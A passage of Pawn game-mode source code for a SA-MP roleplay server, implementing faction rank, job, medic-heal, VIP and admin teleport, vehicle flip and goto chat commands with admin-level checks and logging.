                            if(PINFO[para1][pClan] != lool) return SCM(playerid,COLOR_ALI,"That player isn't in your faction.");
                            GetPlayerName(para1, giveplayer, sizeof(giveplayer));
                            GetPlayerName(playerid, sendername, sizeof(sendername));
                            PlayerInfo[para1][pcRank] = level;
                            SaveKonVal(para1, "pcRank", level);
                            format(string, sizeof(string), "You have been promoted to %d Rank by Leader %s",PlayerInfo[para1][pcRank], sendername);
                            SendClientMessage(para1, COLOR_LIGHTBLUE, string);
                            format(string, sizeof(string), "You have given %s Rank %d he is now have %d rank.", giveplayer,level,PlayerInfo[para1][pcRank]);
                            SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
                        }
                    }
            }
            else
            {
                SendClientMessage(playerid, COLOR_YELLOW, "Only leaders can use this command.");
            }
        }
        return 1;
    }
//----------------------------------[setjob]------------------------------------------------
    if(strcmp(cmd, "/setjob", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            tmp = strtok(cmdtext, idx);
            if(!strlen(tmp))
            {
                SendClientMessage(playerid, COLOR_GRAD2, "USAGE: /setjob [playerid/PartOfName] [jobid)]");
                return 1;
            }
            new para1;
            new jobid;
            para1 = ReturnUser(tmp);
            tmp = strtok(cmdtext, idx);
            jobid = strval(tmp);
            if (PlayerInfo[playerid][pAdmin] >= 1340)
            {
                if(IsPlayerConnected(para1))
                {
                    if(para1 != INVALID_PLAYER_ID)
                    {
                        GetPlayerName(para1, giveplayer, sizeof(giveplayer));
                        GetPlayerName(playerid, sendername, sizeof(sendername));
                        PlayerInfo[para1][pJob] = jobid;
                        SaveKonVal(para1, "pJob", jobid);
                        format(string, 256, "AdmWarning: {FFFFFF}%s has set {FFFFFF}%s job to id {FFFFFF}%d.", sendername,giveplayer,jobid);
                        ABroadCast(COLOR_YELLOW,string,1);
                        SendClientMessage(playerid, COLOR_GRAD1, "   Job has been set successfuly !");
                    }
                }
            }
            else
            {
                SendClientMessage(playerid, COLOR_GREEN, "Error: Your Admin level isn't high enough to use this command.");
            }
        }
        return 1;
    }

	    if(strcmp(cmd, "/sheal", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {

            tmp = strtok(cmdtext, idx);
            if(!strlen(tmp))
            {
                SendClientMessage(playerid, COLOR_GRAD2, "USAGE: /sheal [playerid/PartOfName] [Price)]");
                return 1;
            }
            new para1;
            new price;
            para1 = ReturnUser(tmp);
            tmp = strtok(cmdtext, idx);
            price = strval(tmp);
	    if (!ProxDetectorS(8.0, playerid, para1))
                    {
		    SendClientMessage(playerid, COLOR_MEDIC, "Error: You aren't near his/her.");
		    }
            if (PlayerInfo[playerid][pLeader] == 4 || PlayerInfo[playerid][pMember] == 4)
            {
				if(price < 1 || price > 6) return SCM(playerid,COLOR_ALI,"Price just between 1 untill 5.");
				if(shealdare[para1] != 0) return SCM(playerid,COLOR_ALI,"he/she has request.");
                if(IsPlayerConnected(para1))
                {
                    if(para1 != INVALID_PLAYER_ID)
                    {
                        GetPlayerName(para1, giveplayer, sizeof(giveplayer));
                        GetPlayerName(playerid, sendername, sizeof(sendername));
						shealdare[para1] = 1;
						sprice[para1] = price;
						idss[para1] = playerid;
						new string3[400];
                        format(string3,400, "%s sended a request for heal with price : %d. type /accept heal [playerid/PartOfName]", sendername,price);
                        SendClientMessage(para1, COLOR_LIGHTBLUE, string3);
						new string2[400];
                        format(string2, 400, "you sended a request for heal with price : %d to %s.", price, giveplayer);
                        SendClientMessage(playerid, COLOR_LIGHTBLUE, string2);
                    }
                }
            }
            else
            {
                SendClientMessage(playerid, COLOR_MEDIC, "Error: you are not a medic.");
            }
        }
        return 1;
    }


//----------------------------------[GOTO]-----------------------------------------------
    if(strcmp(cmd, "/gotochilliand", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            if(PlayerInfo[playerid][pAdmin] >= 2)
            {
                if (GetPlayerState(playerid) == 2)
                {
                    new tmpcar = GetPlayerVehicleID(playerid);
                    SetVehiclePos(tmpcar, -2317.8091,-1637.5575,483.7031);
                    TelePos[playerid][0] = 0.0;TelePos[playerid][1] = 0.0;
                }
                else
                {
                    SetPlayerPosEx(playerid, -2317.8091,-1637.5575,483.7031);
                    GameTextForPlayer(playerid, "~w~Chiliad",5000,1);
                }
                SendClientMessage(playerid, COLOR_LIGHTGREEN, "You have been teleported");
                SetPlayerInterior(playerid,0);
                Mahal[playerid] = 9999;
                TooHouse[playerid] = 9999;
                TooBiz[playerid] = 9999;
				new strs[500];
				GetPlayerName(playerid, giveplayer, sizeof(giveplayer));
				format(strs,500,"{00FFFF}Admin {FFFFFF}%s[%i] {00FFFF}Az CMD {57e547}/gotochilliand {00FFFF}Estefade kard.",giveplayer,playerid);
				AdminWarn(strs);
            }
            else
            {
                SendClientMessage(playerid, COLOR_GREEN, "Error: Your Admin level isn't high enough to use this command.");
            }
        }
        return 1;
    }
    if(strcmp(cmd, "/gotobankls", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            if(PlayerInfo[playerid][pAdmin] >= 3)
            {
                if (GetPlayerState(playerid) == 2)
                {
                    new tmpcar = GetPlayerVehicleID(playerid);
                    SetVehiclePos(tmpcar, 1462.2821,-1014.6368,26.5002);
                    TelePos[playerid][0] = 0.0;TelePos[playerid][1] = 0.0;
                }
                else
                {
                    SetPlayerPosEx(playerid, 1462.2821,-1014.6368,26.5002);
                }
                Mahal[playerid] = 9999;
                TooHouse[playerid] = 9999;
                TooBiz[playerid] = 9999;
                SendClientMessage(playerid, COLOR_LIGHTGREEN, "You have been teleported!");
                SetPlayerInterior(playerid,0);
            }
            else
            {
                SendClientMessage(playerid, COLOR_GREEN, "Error: Your Admin level isn't high enough to use this command.");
            }
        }
        return 1;
    }
    if(strcmp(cmd, "/gotobanklv", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            if(PlayerInfo[playerid][pAdmin] >= 3)
            {
                if (GetPlayerState(playerid) == 2)
                {
                    new tmpcar = GetPlayerVehicleID(playerid);
                    SetVehiclePos(tmpcar, 2577.4768,1325.4229,10.8203);
                    TelePos[playerid][0] = 0.0;TelePos[playerid][1] = 0.0;
                }
                else
                {
                    SetPlayerPosEx(playerid, 2577.4768,1325.4229,10.8203);
                }
                Mahal[playerid] = 9999;
                TooHouse[playerid] = 9999;
                TooBiz[playerid] = 9999;
                SendClientMessage(playerid, COLOR_LIGHTGREEN, "You have been teleported!");
                SetPlayerInterior(playerid,0);
            }
            else
            {
                SendClientMessage(playerid, COLOR_GREEN, "Error: Your Admin level isn't high enough to use this command! !");
            }
        }
        return 1;
    }

    if (strcmp(cmd, "/sendls", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            if (PlayerInfo[playerid][pAdmin] >= 7)
            {
                tmp = strtok(cmdtext, idx);
                if(!strlen(tmp))
                {
                    SendClientMessage(playerid, COLOR_GRAD1, "USAGE: /sendls [playerid/PartOfName]");
                    return 1;
                 }
                giveplayerid = ReturnUser(tmp);
                if(IsPlayerConnected(giveplayerid))
                {
                    if(giveplayerid != INVALID_PLAYER_ID)
                    {
                        SetPlayerInterior(giveplayerid, 0);
                        SetPlayerVirtualWorld(giveplayerid, 0);
                        SetPlayerPosEx(giveplayerid,1529.6,-1691.2,13.3);
                        Mahal[giveplayerid] = 9999;
                        TooHouse[giveplayerid] = 9999;
                        TooBiz[giveplayerid] = 9999;
                        SendClientMessage(giveplayerid, COLOR_CRS3, "**  You have been teleported to the LS.");
                    }
                }
            }
            else
            SendClientMessage(playerid, COLOR_CRS3, "   You are not authorized to use this command!");
        }
        return 1;
    }
    if(strcmp(cmd, "/enteryard", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
		 if(yardopen == 0)
         {
         SCM(playerid,COLOR_GREEN,"yard's door not open or you are not near of door.");
         return 1;
         }
            if(PlayerToPoint(2.0, playerid, 1757.300292,-1539.745361,1993.670043))
				{
			if(yardopen == 1)
            {
				SetPlayerPosEx(playerid, 189.705841,1931.397216,17.640625);
				SetPlayerInterior(playerid,0);
				SetPlayerVirtualWorld(giveplayerid, 1020304050);
				}
            }
            else
            {
                SendClientMessage(playerid, COLOR_GREEN, "You aren't near enter yard.");
            }
        }
        return 1;
    }
    if(strcmp(cmd, "/enterjail", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            if(PlayerToPoint(2.0, playerid, 193.368545,1931.499145,17.640625) && GetPlayerVirtualWorld(playerid) == 1020304050)
				{
				SetPlayerPosEx(playerid, 1757.300292,-1539.745361,1993.670043);
				SetPlayerInterior(playerid,0);
				SetPlayerVirtualWorld(giveplayerid, 10);
				}
            else
            {
                SendClientMessage(playerid, COLOR_GREEN, "You aren't near exit yard.");
            }
		}
        return 1;
    }


if (!strcmp("/gotorace8599",cmdtext,true))
{
		SetPlayerPos(playerid,836.44537, -2788.73608, 15.51940);
	return 1;
}
if (!strcmp("/gotorace85999",cmdtext,true))
{
		SetPlayerPos(playerid,1578.57520, -1357.98206, 924.52448);
	return 1;
}

		if(strcmp("/OnMe", cmd, true) == 0)
    {
            if(PlayerInfo[playerid][pAdmin] < 8) return SCM(playerid,COLOR_GREEN,"Error: You are not authorized to use that command.");
                      tmp = strtok(cmdtext,idx);
            if(!strlen(tmp)) return SCM(playerid,COL_SYN, "Syntax: /OnMe [iD]");
            new user = ReturnUser(tmp);
                        Payambar[user] = CreateObject(18728, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0);
            AttachObjectToPlayer(Payambar[user], user, 0.0, 0.0, -1.5, 0.0, 0.0, 0);

        return 1;
    }


	if(strcmp("/onmeoff", cmd, true) == 0)
    {
						if(PlayerInfo[playerid][pAdmin] < 5) return SCM(playerid,COLOR_GREEN,"Error: You are not authorized to use that command.");
	                    tmp = strtok(cmdtext,idx);
						if(!strlen(tmp)) return SCM(playerid,COL_SYN, "Syntax: /paymbar [iD]");
						new user = ReturnUser(tmp);
                        DestroyObject(Payambar[user]);

        return 1;
    }


    if(strcmp(cmd, "/gotols", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            if(PlayerInfo[playerid][pAdmin] >= 3)
            {
                if (GetPlayerState(playerid) == 2)
                {
                    new tmpcar = GetPlayerVehicleID(playerid);
                    SetVehiclePos(tmpcar, 1529.6,-1691.2,13.3);
                    TelePos[playerid][0] = 0.0;TelePos[playerid][1] = 0.0;
                }
                else
                {
                    SetPlayerPosEx(playerid, 1529.6,-1691.2,13.3);
                }
                Mahal[playerid] = 9999;
                TooHouse[playerid] = 9999;
                TooBiz[playerid] = 9999;
                SendClientMessage(playerid, COLOR_GRAD1, "You have been teleported !");
                SetPlayerInterior(playerid,0);
				new strs[500];
				GetPlayerName(playerid, giveplayer, sizeof(giveplayer));
				format(strs,500,"{00FFFF}Admin {FFFFFF}%s[%i] {00FFFF}Az CMD {57e547}/gotols {00FFFF}Estefade kard.",giveplayer,playerid);
				AdminWarn(strs);
            }
            else
            {
                SendClientMessage(playerid, COLOR_GREEN, "Error: Your Admin level isn't high enough to use this command.");
            }
        }
        return 1;
    }


    if(strcmp(cmd, "/Vgotols", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
        if(PlayerInfo[playerid][pPremiumAccount] < 100) return SCM(playerid, COLOR_GREEN, "Vip nistid.");
            {
                if (GetPlayerState(playerid) == 2)
                {
                    new tmpcar = GetPlayerVehicleID(playerid);
                    SetVehiclePos(tmpcar, 1529.6,-1691.2,13.3);
                    TelePos[playerid][0] = 0.0;TelePos[playerid][1] = 0.0;
                }
                else
                {
                    SetPlayerPosEx(playerid, 1529.6,-1691.2,13.3);
                }
                Mahal[playerid] = 9999;
                TooHouse[playerid] = 9999;
                TooBiz[playerid] = 9999;
                SendClientMessage(playerid, COLOR_GRAD1, "You have been teleported !");
                SetPlayerInterior(playerid,0);
				new strs[500];
				GetPlayerName(playerid, giveplayer, sizeof(giveplayer));
				format(strs,500,"{00FFFF}Admin {FFFFFF}%s[%i] {00FFFF}Az CMD {57e547}/gotols {00FFFF}Estefade kard.",giveplayer,playerid);
				AdminWarn(strs);
            }

        }
        return 1;
    }


    if(strcmp(cmd, "/flip", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            if(PlayerInfo[playerid][pAdmin] >= 4)
            {
	    /*
	            new Float:x, Float:y, Float:z;
	            GetPlayerPos(playerid, x, y, z);
		    new Float:angg;
		    GetPlayerFacingAngle(playerid,angg);


                    SetVehiclePos(tmpcar, x, y, z);
		    SetVehicleZAngle(tmpcar, angg);
		    */
		    new Float:angle;
		    new tmpcar = GetPlayerVehicleID(playerid);
		    GetVehicleZAngle(tmpcar,angle);
		    SetVehicleZAngle(tmpcar,angle);
		    RepairVehicleEx(tmpcar);
	            SendClientMessage(playerid, COLOR_GRAD1, "Your vehicle fliped and fixed!");

		    }
		    else
		    {
		    SendClientMessage(playerid, COLOR_GREEN, "Error: Your Admin level isn't high enough to use this command.");
            }
	   }
	   return 1;
	   }


    if(strcmp(cmd, "/Vflip", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
        if(PlayerInfo[playerid][pPremiumAccount] < 100) return SCM(playerid, COLOR_GREEN, "Vip nistid.");
            {
	    /*
	            new Float:x, Float:y, Float:z;
	            GetPlayerPos(playerid, x, y, z);
		    new Float:angg;
		    GetPlayerFacingAngle(playerid,angg);


                    SetVehiclePos(tmpcar, x, y, z);
		    SetVehicleZAngle(tmpcar, angg);
		    */
		    new Float:angle;
		    new tmpcar = GetPlayerVehicleID(playerid);
		    GetVehicleZAngle(tmpcar,angle);
		    SetVehicleZAngle(tmpcar,angle);
		    RepairVehicleEx(tmpcar);
	            SendClientMessage(playerid, COLOR_GRAD1, "Your vehicle fliped and fixed!");

		    }

	   }
	   return 1;
	   }
	   if(strcmp(cmd, "/gotohotel", true) == 0)
	   {
        if(IsPlayerConnected(playerid))
        {
            if(PlayerInfo[playerid][pAdmin] >= 1)
            {
                if (GetPlayerState(playerid) == 2)
                {
                    new tmpcar = GetPlayerVehicleID(playerid);
                    SetVehiclePos(tmpcar, 732.699951,-1276.144897,13.566292);
                    TelePos[playerid][0] = 0.0;TelePos[playerid][1] = 0.0;
                }
                else
                {
                    SetPlayerPosEx(playerid, 732.699951,-1276.144897,13.566292);
                }
                Mahal[playerid] = 9999;
                TooHouse[playerid] = 9999;
                TooBiz[playerid] = 9999;
                SendClientMessage(playerid, COLOR_GRAD1, "You have been teleported !");
                SetPlayerInterior(playerid,0);
            }
            else
            {
                SendClientMessage(playerid, COLOR_GREEN, "Error: Your Admin level isn't high enough to use this command.");
            }
        }
        return 1;
    }


   if(strcmp(cmd, "/gotosf1", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            if(PlayerInfo[playerid][pAdmin] >= 1)
            {
                if (GetPlayerState(playerid) == 2)
                {
                    new tmpcar = GetPlayerVehicleID(playerid);
                    SetVehiclePos(tmpcar, -2022.979125,157.247375,28.835937);
                    TelePos[playerid][0] = 0.0;TelePos[playerid][1] = 0.0;
                }
                else
                {
                    SetPlayerPosEx(playerid, -2022.979125,157.247375,28.835937);
                }
                Mahal[playerid] = 9999;
                TooHouse[playerid] = 9999;
                TooBiz[playerid] = 9999;
                SendClientMessage(playerid, COLOR_GRAD1, "You have been teleported !");
                SetPlayerInterior(playerid,0);
            }
            else
            {
                SendClientMessage(playerid, COLOR_GREEN, "Error: Your Admin level isn't high enough to use this command.");
            }
        }
        return 1;
    }

   if(strcmp(cmd, "/gotobanksf", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            if(PlayerInfo[playerid][pAdmin] >= 1)
            {
                if (GetPlayerState(playerid) == 2)
                {
                    new tmpcar = GetPlayerVehicleID(playerid);
                    SetVehiclePos(tmpcar, -2765.246337,375.215728,6.335937);
                    TelePos[playerid][0] = 0.0;TelePos[playerid][1] = 0.0;
                }
                else
                {
                    SetPlayerPosEx(playerid, -2765.246337,375.215728,6.335937);
                }
                Mahal[playerid] = 9999;
                TooHouse[playerid] = 9999;
                TooBiz[playerid] = 9999;
                SendClientMessage(playerid, COLOR_GRAD1, "You have been teleported !");
                SetPlayerInterior(playerid,0);
            }
            else
            {
                SendClientMessage(playerid, COLOR_GREEN, "Error: Your Admin level isn't high enough to use this command.");
            }
        }
        return 1;
    }

   if(strcmp(cmd, "/gotosf2", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            if(PlayerInfo[playerid][pAdmin] >= 1)
            {
                if (GetPlayerState(playerid) == 2)
                {
                    new tmpcar = GetPlayerVehicleID(playerid);
                    SetVehiclePos(tmpcar, -2560.639892,2476.484863,19.383220);
                    TelePos[playerid][0] = 0.0;TelePos[playerid][1] = 0.0;
                }
                else
                {
                    SetPlayerPosEx(playerid, -2560.639892,2476.484863,19.383220);
                }
                Mahal[playerid] = 9999;
                TooHouse[playerid] = 9999;
                TooBiz[playerid] = 9999;
                SendClientMessage(playerid, COLOR_GRAD1, "You have been teleported !");
                SetPlayerInterior(playerid,0);
            }
            else
            {
                SendClientMessage(playerid, COLOR_GREEN, "Error: Your Admin level isn't high enough to use this command.");
            }
        }
        return 1;
    }

   if(strcmp(cmd, "/gotoairportls", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            if(PlayerInfo[playerid][pAdmin] >= 1)
            {
                if (GetPlayerState(playerid) == 2)
                {
                    new tmpcar = GetPlayerVehicleID(playerid);
                    SetVehiclePos(tmpcar, 1642.098754,-2238.430419,13.497852);
                    TelePos[playerid][0] = 0.0;TelePos[playerid][1] = 0.0;
                }
                else
                {
                    SetPlayerPosEx(playerid, 1642.098754,-2238.430419,13.497852);
                }
                Mahal[playerid] = 9999;
                TooHouse[playerid] = 9999;
                TooBiz[playerid] = 9999;
                SendClientMessage(playerid, COLOR_GRAD1, "You have been teleported !");
                SetPlayerInterior(playerid,0);
            }
            else
            {
                SendClientMessage(playerid, COLOR_GREEN, "Error: Your Admin level isn't high enough to use this command.");
            }
        }
        return 1;
    }

   if(strcmp(cmd, "/gotods", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            if(PlayerInfo[playerid][pAdmin] >= 1)
            {
                if (GetPlayerState(playerid) == 2)
                {
                    new tmpcar = GetPlayerVehicleID(playerid);
                    SetVehiclePos(tmpcar, 329.256439,-1516.191406,35.867187);
                    TelePos[playerid][0] = 0.0;TelePos[playerid][1] = 0.0;
                }
                else
                {
                    SetPlayerPosEx(playerid, 329.256439,-1516.191406,35.867187);
                }
                Mahal[playerid] = 9999;
                TooHouse[playerid] = 9999;
                TooBiz[playerid] = 9999;
                SendClientMessage(playerid, COLOR_GRAD1, "You have been teleported !");
                SetPlayerInterior(playerid,0);
                SetPlayerVirtualWorld(playerid,0);
            }
            else
            {
                SendClientMessage(playerid, COLOR_GREEN, "Error: Your Admin level isn't high enough to use this command.");
            }
        }
        return 1;
    }

    if(strcmp(cmd, "/garals", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            if(PlayerInfo[playerid][pAdmin] >= 3)
            {
                if (GetPlayerState(playerid) == 2)
                {
                    new tmpcar = GetPlayerVehicleID(playerid);
                    SetVehiclePos(tmpcar, 1743.9568,-1855.7620,13.4141);
                    TelePos[playerid][0] = 0.0;TelePos[playerid][1] = 0.0;
                }
                else
                {
                    SetPlayerPosEx(playerid, 1743.9568,-1855.7620,13.4141);
                }
                Mahal[playerid] = 9999;
                TooHouse[playerid] = 9999;
                TooBiz[playerid] = 9999;
                SendClientMessage(playerid, COLOR_GRAD1, "You have been teleported !");
                SetPlayerInterior(playerid,0);
            }
            else
            {
                SendClientMessage(playerid, COLOR_GREEN, "Error: Your Admin level isn't high enough to use this command! !");
            }
        }
        return 1;
    }
    if(strcmp(cmd, "/gotolv", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            if (PlayerInfo[playerid][pAdmin] >= 3)
            {

                if (GetPlayerState(playerid) == 2)
                {
                    new tmpcar = GetPlayerVehicleID(playerid);
                    SetVehiclePos(tmpcar, 1699.2, 1435.1, 10.7);
                    TelePos[playerid][0] = 0.0;TelePos[playerid][1] = 0.0;
                }
                else
                {
                    SetPlayerPosEx(playerid, 1699.2,1435.1, 10.7);
                }
                Mahal[playerid] = 9999;
                TooHouse[playerid] = 9999;
                TooBiz[playerid] = 9999;
                SendClientMessage(playerid, COLOR_GRAD1, "You have been teleported");
                SetPlayerInterior(playerid,0);
				new strs[500];
				GetPlayerName(playerid, giveplayer, sizeof(giveplayer));
				format(strs,500,"{00FFFF}Admin {FFFFFF}%s[%i] {00FFFF}Az CMD {57e547}/gotolv {00FFFF}Estefade kard.",giveplayer,playerid);
				AdminWarn(strs);
            }
            else
            {
                SendClientMessage(playerid, COLOR_GREEN, "Error: Your Admin level isn't high enough to use this command.");
            }
        }
        return 1; // 2267.0500,-1210.4271,1048.4747
    }
    if(strcmp(cmd, "/gotosf", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            if (PlayerInfo[playerid][pAdmin] >= 3)
            {
                if (GetPlayerState(playerid) == 2)
                {
                    new tmpcar = GetPlayerVehicleID(playerid);
                    SetVehiclePos(tmpcar, -1417.0,-295.8,14.1);
                    TelePos[playerid][0] = 0.0;TelePos[playerid][1] = 0.0;
                }
                else
                {
                    SetPlayerPosEx(playerid, -1417.0,-295.8,14.1);
                }
                Mahal[playerid] = 9999;
                TooHouse[playerid] = 9999;
                TooBiz[playerid] = 9999;
                SendClientMessage(playerid, COLOR_GRAD1, "You have been teleported");
                SetPlayerInterior(playerid,0);
				new strs[500];
				GetPlayerName(playerid, giveplayer, sizeof(giveplayer));
				format(strs,500,"{00FFFF}Admin {FFFFFF}%s[%i] {00FFFF}Az CMD {57e547}/gotosf {00FFFF}Estefade kard.",giveplayer,playerid);
				AdminWarn(strs);
            }
            else
            {
                SendClientMessage(playerid, COLOR_GREEN, "Error: Your Admin level isn't high enough to use this command.");
            }
        }
        return 1;
    }
    if(strcmp(cmd, "/gotosft", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
        if (PlayerInfo[playerid][pAdmin] >= 4)
            {
    if (GetPlayerState(playerid) == 2)
    {
        new tmpcar = GetPlayerVehicleID(playerid);
        SetVehiclePos(tmpcar, -2712.4772,217.2832,3.9365);
        TelePos[playerid][0] = 0.0;TelePos[playerid][1] = 0.0;
        }
    else
    {
    SetPlayerPosEx(playerid, -2712.4772,217.2832,3.9365);
    }
    Mahal[playerid] = 9999;
    TooHouse[playerid] = 9999;
    TooBiz[playerid] = 9999;
    SCM(playerid, COLOR_GREEN, "You have been teleported to SF Tuning");
    SetPlayerInterior(playerid,0);
    }
            else
            {
                SendClientMessage(playerid, COLOR_GREEN, "Error: Your Admin level isn't high enough to use this command.");
            }
        }
        return 1;
    }
    if(strcmp(cmd, "/entercar", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
         if(PINFO[playerid][pAdmin] <= 3)
         {
         SCM(playerid,COLOR_GREEN,"Error: Your admin level isn't high enough to use this command.");
         return 1;
         }
            tmp = strtok(cmdtext, idx);
            if(!strlen(tmp))
            {
                SendClientMessage(playerid, COLOR_GRAD1, "USAGE: /entercar [carid] [seatid]");
                return 1;
            }
            new testcar = strval(tmp);
            tmp = strtok(cmdtext, idx);
            if(!strlen(tmp))
            {
                SendClientMessage(playerid, COLOR_GRAD1, "USAGE: /entercar [carid] [seatid]");
                return 1;
            }
            new seatid = strval(tmp);
            PutPlayerInVehicle(playerid, testcar, seatid);
            SendClientMessage(playerid, COLOR_LIGHTGREEN, "You have been teleported.");
        }
        return 1;
    }
    if(strcmp(cmd, "/gotocar", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            tmp = strtok(cmdtext, idx);
            if(!strlen(tmp))
            {
                SendClientMessage(playerid, COLOR_GRAD1, "USAGE: /gotocar [carid]");
                return 1;
            }
            new testcar = strval(tmp);
            if (PlayerInfo[playerid][pAdmin] >= 6)
            {
                new Float:cwx2,Float:cwy2,Float:cwz2;
                GetVehiclePos(testcar, cwx2, cwy2, cwz2);
                if (GetPlayerState(playerid) == 2)
                {
                    new tmpcar = GetPlayerVehicleID(playerid);
                    SetVehiclePos(tmpcar, cwx2, cwy2, cwz2);
                    TelePos[playerid][0] = 0.0;TelePos[playerid][1] = 0.0;
                }
                else
                {
                    SetPlayerPosEx(playerid, cwx2, cwy2, cwz2);
                }
                Mahal[playerid] = 9999;
                TooHouse[playerid] = 9999;
                TooBiz[playerid] = 9999;
                SendClientMessage(playerid, COLOR_LIGHTGREEN, "You have been teleported.");
                SetPlayerInterior(playerid,0);
            }
            else
            {
                SendClientMessage(playerid, COLOR_GREEN, "Error: Your Admin level isn't high enough to use this command.");
            }
        }
        return 1;
    }
    if(strcmp(cmd, "/mark", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            if (PlayerInfo[playerid][pAdmin] >= 3)
            {

                GetPlayerPos(playerid, TeleportDest[playerid][0],TeleportDest[playerid][1],TeleportDest[playerid][2]);
                TelportEtela[playerid][0] = GetPlayerVirtualWorld(playerid);
                TelportEtela[playerid][1] = GetPlayerInterior(playerid);
                TelportEtela[playerid][2] = Mahal[playerid];
                TelportEtela[playerid][4] = TooBiz[playerid];
                TelportEtela[playerid][3] = TooHouse[playerid];
                SendClientMessage(playerid, COLOR_LIGHTGREEN, "teleporter destination set.");
            }
            else
            {
                SendClientMessage(playerid, COLOR_GREEN, "Error: Your Admin level isn't high enough to use this command.");
            }
        }
        return 1;
    }
    if(strcmp(cmd, "/gotomark", true) == 0)
    {
        if(IsPlayerConnected(playerid))
        {
            if (PlayerInfo[playerid][pAdmin] >= 3)
            {

                if (GetPlayerState(playerid) == 2)
                {
                    new tmpcar = GetPlayerVehicleID(playerid);
                    SetVehiclePos(tmpcar, TeleportDest[playerid][0],TeleportDest[playerid][1],TeleportDest[playerid][2]);
                    TelePos[playerid][0] = 0.0;TelePos[playerid][1] = 0.0;
                }
                else
                {
                    SetPlayerPosEx(playerid, TeleportDest[playerid][0],TeleportDest[playerid][1],TeleportDest[playerid][2]);
                }
                SendClientMessage(playerid, COLOR_LIGHTGREEN, "You have been teleported.");
                SetPlayerVirtualWorld(playerid,TelportEtela[playerid][0]);
                    SetPlayerInterior(playerid,TelportEtela[playerid][1]);
                    Mahal[playerid] = TelportEtela[playerid][2];
                    TooHouse[playerid] = TelportEtela[playerid][3];
                    TooBiz[playerid] = TelportEtela[playerid][4];
            }
            else
            {
                SendClientMessage(playerid, COLOR_GREEN, "Error: Your Admin level isn't high enough to use this command.");
            }
        }
        return 1;
    }
    if(!strcmp(cmd, "/goback", true))
    {
        if(PINFO[playerid][pAdmin] <= 0 && PINFO[playerid][pHelper] <= 2) return SCM(playerid,COLOR_GREEN,"Error: Your Admin/Helper level isn't high enough to use this command.");
        if(!IsPlayerInAnyVehicle(playerid))
        {
            SetPlayerPosEx(playerid, GoBack[playerid][0], GoBack[playerid][1], GoBack[playerid][2]);
        }
        SetPlayerInterior(playerid, GoBack1[playerid][0]);
        SetPlayerVirtualWorld(playerid, GoBack1[playerid][1]);
        Mahal[playerid] = GoBack1[playerid][2];
        TooHouse[playerid] = GoBack1[playerid][3];
        TooBiz[playerid] = GoBack1[playerid][4];
        if(IsPlayerInAnyVehicle(playerid))
        {
            SetVehiclePos(GetPlayerVehicleID(playerid), GoBack[playerid][0], GoBack[playerid][1], GoBack[playerid][2]);
            LinkVehicleToInterior(GetPlayerVehicleID(playerid), GoBack1[playerid][0]);
            SetVehicleVirtualWorld(GetPlayerVehicleID(playerid), GoBack1[playerid][1]);
        }
        return SCM(playerid, COLOR_GG, "You have been teleported.");
    }


		if(strcmp(cmd, "/Vgoto", true) == 0)
		{
        if(PlayerInfo[playerid][pPremiumAccount] <= 99) return SCM(playerid, COLOR_GREEN, "Vip nistid.");
			tmp = strtok(cmdtext,idx);
			if(!strlen(tmp)) return SCM(playerid,COL_SYN,"Syntax: /Vgoto <PlayerID/PartOfName>");
			new user = ReturnUser(tmp);
			if(!IsPlayerConnected(user)) return SCM(playerid,COLOR_YELLOW2,"Player isn't connected.");
		if(PINFO[playerid][pAdmin] < PINFO[user][pAdmin]) return SCM(playerid, COLOR_AMIR, "Shoma Nemitoni be admin balatar az khodet goto koni.");
			GetPlayerPos(playerid, GoBack[playerid][0], GoBack[playerid][1], GoBack[playerid][2]);
			GoBack1[playerid][0] = GetPlayerInterior(playerid);
			GoBack1[playerid][1] = GetPlayerVirtualWorld(playerid);
			GoBack1[playerid][2] = Mahal[playerid];
			GoBack1[playerid][3] = TooHouse[playerid];
			GoBack1[playerid][4] = TooBiz[playerid];
			new Float:PpX,Float:PpY,Float:PpZ;
			GetPlayerPos(user,PpX,PpY,PpZ);
			if(IsPlayerInAnyVehicle(user)) GetVehiclePos(GetPlayerVehicleID(user),PpX,PpY,PpZ);
			SetPlayerVirtualWorld(playerid,GetPlayerVirtualWorld(user));
			SetPlayerInterior(playerid,GetPlayerInterior(user));
			Mahal[playerid] = Mahal[user];
			TooHouse[playerid] = TooHouse[user];
			TooBiz[playerid] = TooBiz[user];
			new admname[64];
			GetPlayerName(playerid, admname, sizeof(admname));
			new tarafn[40];
			GetPlayerName(user, tarafn, sizeof(tarafn));
			new toto[128];
			format(toto,sizeof(toto),"{C60000}Vip %s goes to you",admname);
			new adm[512];
			format(adm, sizeof(adm), "{FF33GG}Vip {57e547}%s {FFFFFF}Be Bazikon {FF33GG}%s {FFFFFF}Goto Kard.", admname, tarafn);
			AdminWarn(adm);
			SCM(user,COLOR_RED,toto);
			if(IsPlayerInAnyVehicle(playerid))
			{
				GetVehiclePos(GetPlayerVehicleID(playerid), GoBack[playerid][0], GoBack[playerid][1], GoBack[playerid][2]);
				SetVehiclePos(GetPlayerVehicleID(playerid),PpX+0.5,PpY+0.5,PpZ);
				LinkVehicleToInterior(GetPlayerVehicleID(playerid),GetPlayerInterior(user));
